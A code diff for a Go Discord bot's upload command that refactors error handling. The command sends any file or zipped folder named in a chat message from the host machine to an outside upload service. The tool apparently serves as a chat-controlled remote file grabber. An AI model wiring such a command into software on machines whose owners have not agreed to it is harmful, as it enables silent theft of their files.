@@ -20,25 +20,25 @@ const (
 	uploadSuccess string = "🟩 Uploaded at: "
 )
 
-func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
+func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	if len(args) == 0 {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadArgsError+"\nUsage: "+uploadUsage, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, uploadArgsError+"\nUsage: "+uploadUsage, m.Reference())
+		return
 	}
 
 	path := args[0]
 	info, err := os.Stat(path)
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
+		return
 	}
 
 	var filePath string
 	if info.IsDir() {
 		filePath, err = utils.ZipFolder(path)
 		if err != nil {
-			_, err := s.ChannelMessageSendReply(m.ChannelID, uploadZipError, m.Reference())
-			return err
+			s.ChannelMessageSendReply(m.ChannelID, uploadZipError, m.Reference())
+			return
 		}
 	} else {
 		filePath = path
@@ -46,20 +46,19 @@ func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 
 	file, err := os.Open(filePath)
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadOpenFileError, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, uploadOpenFileError, m.Reference())
+		return
 	}
 
 	defer file.Close()
 
 	url, err := utils.UploadFile(filePath, file)
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
+		return
 	}
 
-	_, err = s.ChannelMessageSendReply(m.ChannelID, uploadSuccess+url, m.Reference())
-	return err
+	s.ChannelMessageSendReply(m.ChannelID, uploadSuccess+url, m.Reference())
 }
 
 func (*UploadCommand) Name() string {
